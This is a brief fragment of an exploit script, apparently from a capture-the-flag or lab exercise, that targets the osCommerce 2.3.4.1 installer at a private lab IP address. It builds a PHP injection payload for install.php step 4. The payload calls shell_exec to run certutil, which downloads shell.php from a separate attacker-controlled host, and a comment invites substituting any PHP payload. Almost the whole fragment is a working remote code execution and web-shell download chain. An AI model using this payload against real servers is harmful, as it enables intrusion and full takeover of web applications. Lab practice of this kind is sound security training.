...
base_url = "http://10.10.75.227:8080/oscommerce-2.3.4.1/catalog/"
target_url = "http://10.10.75.227:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"
...
payload = '\');'
payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.9.241.177/shell.php shell.php");'
payload += 'echo $var;'    # this is where you enter you PHP payload
payload += '/*'
